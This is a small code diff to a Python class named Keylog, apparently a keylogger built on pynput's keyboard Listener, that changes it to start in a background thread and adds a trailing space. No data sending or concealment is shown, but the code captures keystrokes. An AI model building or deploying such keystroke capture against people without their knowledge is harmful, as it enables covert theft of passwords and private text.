@@ -29,7 +29,7 @@ class Keylog(Thread):
     def stop(self):
         self.on_release(Key.esc)
     def on_release(self,key):
-        if key == Key.esc:
+        if key == Key.esc: 
             return False
     def run(self):
         with Listener(on_press= self.on_press, on_release= self.on_release) as listener:
@@ -37,7 +37,7 @@ class Keylog(Thread):
 logger = Keylog()
 def run():
     global logger
-    logger.run()
+    logger.start()
 def stop():
     global logger
     logger.stop()
